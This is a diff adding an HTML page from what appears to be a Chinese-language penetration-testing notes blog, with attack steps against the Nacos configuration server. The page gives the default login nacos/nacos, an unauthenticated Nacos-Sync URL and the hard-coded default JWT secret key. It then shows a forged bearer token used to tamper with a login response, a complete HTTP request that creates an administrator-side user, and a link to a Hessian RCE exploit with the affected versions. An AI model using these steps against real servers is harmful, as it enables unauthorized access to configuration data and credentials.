@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>nacos - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "nacos", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u6e17\u900f", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../nginx%20webui/nginx%20webui/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../nginx%20webui/nginx%20webui/" class="btn btn-xs btn-link">
+        nginx webui
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/" class="btn btn-xs btn-link">
+        jumpserver堡垒机
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="nacos">nacos</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#渗透">渗透</a><ul>
+<li><a href="#默认密码">默认密码</a></li>
+<li><a href="#Nacos-Sync未授权漏洞">Nacos-Sync未授权漏洞</a></li>
+<li><a href="#默认token">默认token</a></li>
+<li><a href="#hessian-rce">hessian rce</a></li>
+</ul>
+</li>
+</ul>
+<p>里面有很多配置文件，拿到了有大作用</p>
+<h2 id="_2">渗透</h2>
+<h3 id="_3">默认密码</h3>
+<p>nacos nacos</p>
+<h3 id="nacos-sync">Nacos-Sync未授权漏洞</h3>
+<p><a href="https://xxx.xxx.xxx/#/serviceSync" title="https://xxx.xxx.xxx/#/serviceSync">https://xxx.xxx.xxx/#/serviceSync</a></p>
+<h3 id="token">默认token</h3>
+<pre><code class="language-纯文本">The default token(Base64 String):
+nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789
+
+2.1.0 版本后
+nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789
+</code></pre>
+<p>Nacos 平台在默认配置下未对 token.secret.key 进行修改，攻击者通过漏洞可以获取服务器数据库/OSS等权限。</p>
+<p>然后通过jwt平台生成accesskey，时间戳晚于现在时间，需要勾选base64加密</p>
+<p><img alt="" src="../image/image_gqJSf608J9.png" /></p>
+<p>输入密码，然后修改response，直接进入后台</p>
+<pre><code class="language-纯文本">HTTP/1.1 200
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA
+Content-Type: application/json; charset=utf-8
+Date: Tue, 14 Mar 2023 16:34:47 GMT
+Content-Length: 206
+
+{
+ &quot;accessToken&quot;: &quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&quot;,
+ &quot;tokenTtl&quot;: 18000,
+ &quot;globalAdmin&quot;: false,
+ &quot;username&quot;: &quot;nacos&quot;
+}
+</code></pre>
+<p>或者直接增添用户</p>
+<pre><code class="language-纯文本">POST /nacos/v1/auth/users HTTP/1.1
+Host:
+User-Agent: Nacos-Server
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+username=test&amp;password=test
+</code></pre>
+<h3 id="hessian-rce">hessian rce</h3>
+<ul>
+<li>1.4.0 &lt;= Nacos &lt; 1.4.6</li>
+<li>2.0.0 &lt;= Nacos &lt; 2.2.3</li>
+</ul>
+<p><a href="https://github.com/c0olw/NacosRce/releases/tag/v0.5" title="https://github.com/c0olw/NacosRce/releases/tag/v0.5">https://github.com/c0olw/NacosRce/releases/tag/v0.5</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../nginx%20webui/nginx%20webui/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../nginx%20webui/nginx%20webui/" class="btn btn-xs btn-link">
+        nginx webui
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/" class="btn btn-xs btn-link">
+        jumpserver堡垒机
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
